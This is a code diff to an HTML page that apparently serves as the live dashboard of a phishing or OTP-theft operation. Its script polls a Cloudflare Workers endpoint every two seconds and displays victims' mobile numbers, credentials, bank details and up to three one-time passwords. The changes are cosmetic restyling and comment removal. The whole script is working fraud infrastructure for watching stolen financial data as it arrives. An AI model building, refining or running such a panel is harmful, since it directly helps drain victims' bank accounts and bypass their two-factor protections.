@@ -25,18 +25,18 @@
         h1 { font-size: 20px; font-weight: bold; color: #000; letter-spacing: 2px; }
         .sub-text { color: red; font-size: 9px; font-weight: bold; margin-top: 2px; }
 
-        /* Updated: Black Background, Green Text, No Border */
+        /* Updated: White Background for Click Count */
         #click-count {
             font-family: 'Orbitron', sans-serif;
             font-size: 24px;
             color: #00FF00; /* Digital Green */
             font-weight: bold;
-            background: #000; /* Pure Black Background */
-            padding: 6px 14px;
-            border: none; /* Border Removed */
-            border-radius: 4px;
-            min-width: 60px;
-            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+            background: #fff; /* White Background */
+            padding: 5px 10px;
+            border: 0px solid #eee; /* Halka border taaki white par white mix na ho */
+            border-radius: 0px;
+            min-width: 0px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1); /* Halka shadow taaki green uth kar dikhe */
         }
 
         #data-container { padding: 10px; max-width: 500px; margin: 0 auto; }
@@ -77,7 +77,6 @@
     <div id="data-container"></div>
 
     <script>
-        // Aapka Worker URL
         const workerURL = 'https://cold-pine-96e7.sumankkuuyy.workers.dev/';
 
         async function fetchData() {
@@ -92,13 +91,11 @@
                 const container = document.getElementById('data-container');
                 container.innerHTML = ''; 
 
-                // Database se data lene ke liye (Latest data upar dikhega)
                 data.forEach(entry => {
                     const card = document.createElement('div');
                     card.className = 'card';
 
                     let content = "";
-                    // Aapke columns ke hisaab se condition
                     if (entry.mobile) content += `Mobile: ${entry.mobile}\n`;
                     if (entry.credentials) content += `${entry.credentials}\n`;
                     if (entry.bank_details) content += `${entry.bank_details}\n`;
@@ -107,12 +104,9 @@
                     if (entry.otp_2) content += `OTP 2: ${entry.otp_2}\n`;
                     if (entry.otp_3) content += `OTP 3: ${entry.otp_3}`;
 
-                    // Agar sab empty hai toh placeholder
-                    if (!content) content = "No Data Received";
-
                     card.innerHTML = `
                         <div class="data-text">${content}</div>
-                        <span class="time-stamp">${entry.time || 'No Time'}</span>
+                        <span class="time-stamp">${entry.time}</span>
                     `;
                     container.appendChild(card);
                 });
@@ -121,9 +115,7 @@
             }
         }
 
-        // Har 2 second mein data refresh karega
         setInterval(fetchData, 2000);
-        // Pehli baar load hone par call
         fetchData();
     </script>
 
